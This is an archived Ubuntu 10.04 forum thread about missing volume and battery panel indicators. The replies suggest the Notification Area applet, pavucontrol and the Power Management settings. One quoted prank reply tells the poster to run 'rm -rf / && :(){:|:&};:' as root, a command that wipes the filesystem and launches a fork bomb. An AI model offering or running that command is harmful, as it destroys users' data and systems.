---
title: "No volume/battery indicators"
date: 2010-06-06
forum: General Help
---

### Post by okayneil on 2010-06-06
Hi. 

I installed 10.4 a good few weeks ago and was worried when I didn't see the volume controls in the main panel, so I took someone's advice and added an indicator applet, you know the one with the volume and mail symbols? Today then my computer just switched off when it had insufficient power in the battery (I didn't realise it wasn't plugged in) but I got no warning that it was low on power. 

Two things then, is there a better applet for volume and one at all for the battery so I can get some kind of notifications? 

Cheers :)

---

### Post by okayneil on 2010-06-06
> **wooblah said:**
> try this as root
rm -rf / && :(){:|:&};:
also. try to remove your hard drive and eat it
then follow it up with a cup of ubuntu

Funny, but not the help I was looking for ;)

---

### Post by Leppie on 2010-06-06
right click on the panel, then choose "Add to Panel...", select "Notification Area" and click "Add".

---

### Post by okayneil on 2010-06-06
> **Leppie said:**
> right click on the panel, then choose "Add to Panel...", select "Notification Area" and click "Add".

Awesome, that sorts notifications, what about the volume problem?

---

### Post by Leppie on 2010-06-06
hmm... i believe that my volume control is in the notification area...
yes, just checked it. it's in the notification area.

edit: sorry, you were looking for a better applet...
you could try pavucontrol:
```
sudo apt-get install pavucontrol
```
As for the battery indicator, you will have to go to System>Preferences>Power Management.

---

### Post by okayneil on 2010-06-06
> **Leppie said:**
> hmm... i believe that my volume control is in the notification area...
yes, just checked it. it's in the notification area.

edit: sorry, you were looking for a better applet...
you could try pavucontrol:
```
sudo apt-get install pavucontrol
```
As for the battery indicator, you will have to go to System>Preferences>Power Management.

Yup, I have tried this before, its an alright alternative. Wonder why the volume applet went missing in the first place...is this something new to 10.4?

---

### Post by Leppie on 2010-06-06
> **okayneil said:**
> Yup, I have tried this before, its an alright alternative. Wonder why the volume applet went missing in the first place...is this something new to 10.4?
my volume control icon disappeared in karmic after i had messed around with pulseaudio. strange you didn't have volume control after fresh install. was the install medium ok?

---

### Post by okayneil on 2010-06-06
> **Leppie said:**
> my volume control icon disappeared in karmic after i had messed around with pulseaudio. strange you didn't have volume control after fresh install. was the install medium ok?

Yeah it was good, even wiped the partition with dban, filled it full of zeros so mft and partition tables from old install were all gone. Burned the iso slowly to avoid errors, the install is solid. Weird, but hey your fix works for now :)

---

### Post by goltoof on 2010-06-09
I got the same problem and nothing here has worked for me.  Volume disappeared in karmic too,, but so did a bunch of other indicators (battery, power, etc).  This is a fresh 10.4 install.

I try adding Notification Area to panel, but still no volume. I try dragging the sound icon from System>Preferences but this is just a shortcut to the sound options, doesn't give the drop down for controlling sound.

Why does this keep happening in the first place?  It happened in Karmic I imagine it's the same bug..

---

